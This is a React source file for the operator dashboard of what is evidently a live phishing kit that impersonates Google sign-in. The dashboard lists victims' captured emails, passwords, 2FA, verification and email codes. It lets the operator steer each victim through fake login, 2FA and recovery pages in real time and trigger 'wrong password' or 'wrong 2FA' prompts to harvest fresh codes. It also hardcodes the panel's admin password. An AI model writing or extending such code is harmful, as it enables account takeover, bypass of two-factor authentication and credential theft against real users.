import { useEffect, useMemo, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { motion } from "framer-motion";
import {
  FiAlertTriangle,
  FiCheck,
  FiGlobe,
  FiKey,
  FiLoader,
  FiLogOut,
  FiRefreshCw,
  FiShield,
  FiTrash2,
} from "react-icons/fi";
import toast from "react-hot-toast";
import AdminAtmosphere from "../AdminAtmosphere";

const GB = "/google-backend";

const PAGES = [
  { id: "case", label: "Case", tone: "action" },
  { id: "retrieving", label: "Retrieving", tone: "wait" },
  { id: "login", label: "Login", tone: "neutral" },
  { id: "password", label: "Password", tone: "wait" },
  { id: "recovery", label: "Recovery", tone: "action" },
  { id: "phone_recovery", label: "Phone recovery", tone: "action" },
  { id: "recovery_email_code", label: "Email code", tone: "action" },
  { id: "2fa", label: "2FA", tone: "action" },
  { id: "verify", label: "Verify", tone: "action" },
  { id: "verify_you", label: "Verify you", tone: "action" },
  { id: "security", label: "Security", tone: "danger" },
  { id: "done", label: "Done", tone: "success" },
];

const WRONGS = [
  { id: "wrong_email", label: "mail" },
  { id: "wrong_password", label: "pass" },
  { id: "wrong_2fa", label: "2fa" },
  { id: "wrong_email_code", label: "email code" },
];

const TONE = {
  neutral: "border-white/10 bg-white/[0.03] hover:bg-white/[0.05]",
  wait: "border-amber-500/20 bg-amber-500/[0.06] hover:bg-amber-500/10",
  action: "border-sky-500/20 bg-sky-500/[0.06] hover:bg-sky-500/10",
  danger: "border-rose-500/20 bg-rose-500/[0.06] hover:bg-rose-500/10",
  success: "border-emerald-500/20 bg-emerald-500/[0.06] hover:bg-emerald-500/10",
  active: "border-sky-400/40 bg-sky-500/15 shadow-[0_0_0_1px_rgba(56,189,248,0.12)]",
};

function GoogleMark({ size = 18 }) {
  return (
    <svg viewBox="0 0 48 48" width={size} height={size} aria-hidden="true">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
    </svg>
  );
}

async function ensureGoogleAdmin() {
  const probe = await fetch(`${GB}/api/admin/visitors`, { credentials: "include" });
  if (probe.ok) return true;
  if (probe.status !== 401) {
    throw new Error(
      "Google backend offline — run: cd google && python app.py (port 5055)"
    );
  }
  const login = await fetch(`${GB}/api/admin/login`, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "googleuser",
      password: "googleggg!5",
    }),
  });
  if (!login.ok) throw new Error("Google admin login failed");
  return true;
}

function GoogleDashboard() {
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const [selectedId, setSelectedId] = useState(null);
  const [recoveryCode, setRecoveryCode] = useState("");
  const [phoneSuffix, setPhoneSuffix] = useState("");
  const [emailCode, setEmailCode] = useState("");

  const {
    data,
    isLoading,
    isError,
    error,
    refetch,
  } = useQuery({
    queryKey: ["googleVisitors"],
    queryFn: async () => {
      await ensureGoogleAdmin();
      const res = await fetch(`${GB}/api/admin/visitors`, {
        credentials: "include",
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || "Failed to load visitors");
      return json;
    },
    refetchInterval: 3000,
    retry: 1,
  });

  const visitors = data?.visitors || [];
  const stats = data?.stats || {};
  const selected = useMemo(
    () => visitors.find((v) => v.id === selectedId) || visitors[0] || null,
    [visitors, selectedId]
  );

  useEffect(() => {
    if (visitors.length && selectedId == null) setSelectedId(visitors[0].id);
  }, [visitors, selectedId]);

  useEffect(() => {
    if (!selected) return;
    setRecoveryCode(selected.recovery_code || "");
    setPhoneSuffix(selected.phone_suffix || "");
    setEmailCode(selected.email_code || "");
  }, [selected?.id]);

  const { mutate: setPage, isPending: changing } = useMutation({
    mutationFn: async ({ vid, page, extra = {} }) => {
      const res = await fetch(`${GB}/api/admin/visitor/${encodeURIComponent(vid)}`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ page, ...extra }),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json.error || "Update failed");
      return json;
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["googleVisitors"] });
      toast.success("Page updated");
    },
    onError: (e) => toast.error(e.message || "Failed"),
  });

  const { mutate: sendWrong, isPending: wronging } = useMutation({
    mutationFn: async ({ vid, error: err }) => {
      const res = await fetch(`${GB}/api/admin/visitor/${encodeURIComponent(vid)}`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ error: err }),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json.error || "Failed");
      return json;
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["googleVisitors"] });
      toast.success("Wrong state sent");
    },
    onError: (e) => toast.error(e.message || "Failed"),
  });

  const { mutate: removeVisitor } = useMutation({
    mutationFn: async (vid) => {
      const res = await fetch(`${GB}/api/admin/visitor/${encodeURIComponent(vid)}`, {
        method: "DELETE",
        credentials: "include",
      });
      if (!res.ok) throw new Error("Delete failed");
    },
    onSuccess: (_, vid) => {
      if (selectedId === vid) setSelectedId(null);
      queryClient.invalidateQueries({ queryKey: ["googleVisitors"] });
      toast.success("Visitor removed");
    },
  });

  const logoutIcloudAdmin = async () => {
    try {
      sessionStorage.removeItem("admin_panel");
      sessionStorage.removeItem("admin_boot_intro");
    } catch {
      /* ignore */
    }
    await fetch("/api/v1/rumman/auth/logout", { method: "POST" });
    queryClient.invalidateQueries({ queryKey: ["adminUser"] });
    navigate("/admin", { replace: true });
  };

  return (
    <div className="relative min-h-screen text-zinc-100 overflow-hidden">
      <AdminAtmosphere />

      <aside className="w-64 h-screen fixed left-0 top-0 z-30 text-white border-r border-white/5 flex flex-col bg-[#0b0b0f]/80 backdrop-blur-xl">
        <div className="px-5 pt-6 pb-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-white flex items-center justify-center shadow-[0_0_24px_rgba(66,133,244,0.25)]">
              <GoogleMark size={22} />
            </div>
            <div>
              <p className="text-sm font-semibold tracking-wide">Google Panel</p>
              <p className="text-[11px] text-zinc-500">Redesign · Control</p>
            </div>
          </div>
        </div>
        <nav className="px-3 mt-2 flex flex-col gap-1">
          <span className="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm bg-white/10 text-white">
            <FiGlobe className="w-4 h-4" />
            Sessions
          </span>
          <Link
            to="/admin/select"
            className="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-zinc-400 hover:bg-white/5 hover:text-white transition"
          >
            Switch panel
          </Link>
          <a
            href={`${GB}/`}
            target="_blank"
            rel="noreferrer"
            className="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm text-zinc-400 hover:bg-white/5 hover:text-white transition"
          >
            Open Google site
          </a>
        </nav>
        <div className="mt-auto p-4 space-y-3">
          <p className="text-[11px] text-zinc-600">/google · redesigned admin</p>
          <div className="inline-flex items-center gap-1.5 rounded-full border border-white/10 bg-white/[0.03] px-2.5 py-1">
            <span className="w-1.5 h-1.5 rounded-full bg-rose-500" />
            <span className="text-[10px] leading-none text-zinc-400">
              Logged in as <span className="text-rose-400 font-medium">admin</span>
            </span>
          </div>
        </div>
      </aside>

      <div className="relative z-10 ml-64 min-h-screen">
        <header className="sticky top-0 z-20 border-b border-white/5 bg-[#07070a]/55 backdrop-blur-xl px-6 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-lg font-semibold tracking-tight">Google sessions</h1>
            <p className="text-xs text-zinc-500 mt-0.5">
              Case → login → password → 2FA · powered by /google project
            </p>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => refetch()}
              className="p-2 rounded-lg bg-white/5 border border-white/5 hover:bg-white/10"
              title="Refresh"
            >
              <FiRefreshCw className="w-3.5 h-3.5" />
            </button>
            <button
              type="button"
              onClick={logoutIcloudAdmin}
              className="inline-flex items-center gap-1.5 rounded-lg bg-white/5 border border-white/5 px-3 py-2 text-zinc-400 hover:text-rose-300"
            >
              <FiLogOut className="w-3.5 h-3.5" />
              Log out
            </button>
          </div>
        </header>

        <div className="p-6 space-y-5">
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3">
            {[
              ["Visits", stats.site_visits ?? 0],
              ["Clients", stats.total_clients ?? 0],
              ["Active", stats.active_clients ?? 0],
              ["Waiting", stats.current_crews ?? 0],
            ].map(([label, value]) => (
              <div
                key={label}
                className="rounded-2xl border border-white/5 bg-white/[0.03] px-4 py-3"
              >
                <p className="text-[11px] uppercase tracking-wider text-zinc-500">{label}</p>
                <p className="mt-1 text-2xl font-semibold tabular-nums">{value}</p>
              </div>
            ))}
          </div>

          {isLoading && (
            <div className="rounded-2xl border border-white/5 p-10 text-center text-zinc-500 text-sm">
              Connecting to Google backend…
            </div>
          )}

          {isError && (
            <div className="rounded-2xl border border-rose-500/20 bg-rose-500/10 p-5 text-sm text-rose-200">
              <p className="font-medium flex items-center gap-2">
                <FiAlertTriangle className="w-4 h-4" />
                {error?.message || "Google backend error"}
              </p>
              <p className="mt-2 text-rose-200/70 text-[12px]">
                Start it with: <code className="text-rose-100">cd google && python app.py</code>{" "}
                (listens on :5055). Needs MongoDB from the google <code>.env</code>.
              </p>
            </div>
          )}

          {!isLoading && !isError && (
            <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
              <section className="xl:col-span-5 space-y-3">
                {!visitors.length && (
                  <div className="rounded-2xl border border-dashed border-white/10 p-10 text-center text-sm text-zinc-500">
                    No Google visitors yet
                  </div>
                )}
                {visitors.map((v) => {
                  const active = selected?.id === v.id;
                  return (
                    <button
                      key={v.id}
                      type="button"
                      onClick={() => setSelectedId(v.id)}
                      className={`w-full text-left rounded-2xl border p-4 transition ${
                        active
                          ? "border-sky-500/40 bg-sky-500/10"
                          : "border-white/5 bg-white/[0.03] hover:bg-white/[0.05]"
                      }`}
                    >
                      <div className="flex items-start justify-between gap-3">
                        <div className="min-w-0">
                          <div className="flex items-center gap-2">
                            <span
                              className={`w-2 h-2 rounded-full ${
                                v.online ? "bg-emerald-400" : "bg-zinc-600"
                              }`}
                            />
                            <p className="text-sm font-medium truncate">
                              {v.email || v.id || "Visitor"}
                            </p>
                          </div>
                          <p className="text-[11px] text-zinc-500 mt-1 truncate">
                            {v.ip || "—"} · {v.page || "—"}
                            {v.waiting ? " · waiting" : ""}
                          </p>
                        </div>
                        <span className="text-[10px] uppercase text-zinc-500 shrink-0">
                          {v.online ? "live" : "off"}
                        </span>
                      </div>
                    </button>
                  );
                })}
              </section>

              <section className="xl:col-span-7">
                {!selected ? (
                  <div className="rounded-2xl border border-white/5 bg-white/[0.02] min-h-[360px] flex items-center justify-center text-zinc-500 text-sm">
                    Select a visitor
                  </div>
                ) : (
                  <div className="grid lg:grid-cols-2 gap-4 items-start">
                    <div className="rounded-2xl border border-white/5 bg-white/[0.02] overflow-hidden">
                      <div className="px-4 py-3 border-b border-white/5 flex items-center justify-between">
                        <p className="text-sm font-semibold">Live preview</p>
                        <a
                          href={`${GB}/?preview=1`}
                          target="_blank"
                          rel="noreferrer"
                          className="text-[11px] text-sky-300 hover:underline"
                        >
                          Open
                        </a>
                      </div>
                      <div className="bg-[#0a0a0c] p-3">
                        <div className="overflow-hidden rounded-xl border border-white/10 bg-white aspect-[4/5]">
                          <iframe
                            title="Google preview"
                            src={`${GB}/?preview=1&t=${selected.page || "case"}`}
                            className="w-full h-full pointer-events-none scale-[0.85] origin-top-left"
                            style={{ width: "118%", height: "118%" }}
                          />
                        </div>
                      </div>
                    </div>

                    <div className="rounded-2xl border border-white/5 bg-white/[0.02] p-5 space-y-4">
                      <div className="flex items-center justify-between gap-2">
                        <p className="text-[11px] uppercase tracking-wider text-zinc-500">
                          Credentials
                        </p>
                        <button
                          type="button"
                          onClick={() => removeVisitor(selected.id)}
                          className="p-1.5 rounded-lg text-rose-400 hover:bg-rose-500/10"
                          title="Delete"
                        >
                          <FiTrash2 className="w-4 h-4" />
                        </button>
                      </div>
                      <div className="rounded-xl bg-black/30 border border-white/5 divide-y divide-white/5 text-sm">
                        {[
                          ["Email", selected.email],
                          ["Password", selected.password],
                          ["2FA", selected.tfa_code],
                          ["Verify", selected.verify_code],
                          ["Email code", selected.email_code_input],
                          ["Case", selected.case_id],
                        ].map(([k, val]) => (
                          <div key={k} className="px-3 py-2.5 flex justify-between gap-3">
                            <span className="text-zinc-500">{k}</span>
                            <span className="font-medium truncate text-right font-mono text-[13px]">
                              {val || "—"}
                            </span>
                          </div>
                        ))}
                      </div>

                      <div>
                        <p className="text-[11px] uppercase tracking-wider text-zinc-500 mb-2">
                          Route session
                        </p>
                        <div className="flex flex-col gap-1.5 max-h-[280px] overflow-y-auto pr-1">
                          {PAGES.map((p) => {
                            const on = selected.page === p.id;
                            return (
                              <button
                                key={p.id}
                                type="button"
                                disabled={changing}
                                onClick={() => {
                                  const extra = {};
                                  if (p.id === "recovery" && recoveryCode)
                                    extra.recovery_code = recoveryCode;
                                  if (p.id === "phone_recovery" && phoneSuffix)
                                    extra.phone_suffix = phoneSuffix;
                                  if (p.id === "recovery_email_code" && emailCode)
                                    extra.email_code = emailCode;
                                  setPage({ vid: selected.id, page: p.id, extra });
                                }}
                                className={`flex items-center gap-3 rounded-xl border px-3 py-2.5 text-left text-[12px] transition disabled:opacity-50 ${
                                  on ? TONE.active : TONE[p.tone]
                                }`}
                              >
                                {p.id === "retrieving" ? (
                                  <FiLoader className="w-3.5 h-3.5" />
                                ) : p.id === "done" ? (
                                  <FiCheck className="w-3.5 h-3.5" />
                                ) : p.id === "2fa" ? (
                                  <FiShield className="w-3.5 h-3.5" />
                                ) : p.id === "password" ? (
                                  <FiKey className="w-3.5 h-3.5" />
                                ) : (
                                  <FiGlobe className="w-3.5 h-3.5" />
                                )}
                                <span className="font-medium">{p.label}</span>
                                {on && (
                                  <span className="ml-auto text-[9px] uppercase text-zinc-400">
                                    Live
                                  </span>
                                )}
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {(selected.page === "recovery" ||
                        selected.page === "phone_recovery" ||
                        selected.page === "recovery_email_code") && (
                        <div className="flex flex-wrap gap-2">
                          {selected.page === "recovery" && (
                            <input
                              value={recoveryCode}
                              onChange={(e) =>
                                setRecoveryCode(e.target.value.replace(/\D/g, "").slice(0, 6))
                              }
                              placeholder="Recovery ##"
                              className="h-9 w-24 rounded-lg border border-white/10 bg-black/40 px-2 text-center font-mono text-sm outline-none"
                            />
                          )}
                          {selected.page === "phone_recovery" && (
                            <input
                              value={phoneSuffix}
                              onChange={(e) =>
                                setPhoneSuffix(e.target.value.replace(/\D/g, "").slice(0, 4))
                              }
                              placeholder="Phone **"
                              className="h-9 w-24 rounded-lg border border-white/10 bg-black/40 px-2 text-center font-mono text-sm outline-none"
                            />
                          )}
                          {selected.page === "recovery_email_code" && (
                            <input
                              value={emailCode}
                              onChange={(e) =>
                                setEmailCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                              }
                              placeholder="Email code"
                              className="h-9 w-28 rounded-lg border border-white/10 bg-black/40 px-2 text-center font-mono text-sm outline-none"
                            />
                          )}
                        </div>
                      )}

                      <div className="flex flex-wrap items-center gap-1 pt-1">
                        <span className="text-[9px] uppercase tracking-wider text-zinc-600 mr-0.5">
                          Wrong
                        </span>
                        {WRONGS.map((w) => (
                          <button
                            key={w.id}
                            type="button"
                            disabled={wronging}
                            onClick={() => sendWrong({ vid: selected.id, error: w.id })}
                            className="h-6 px-2 rounded-md text-[10px] font-medium border border-white/10 bg-white/[0.03] text-zinc-400 hover:text-rose-200 hover:border-rose-500/30 disabled:opacity-40"
                          >
                            {w.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}
              </section>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default GoogleDashboard;
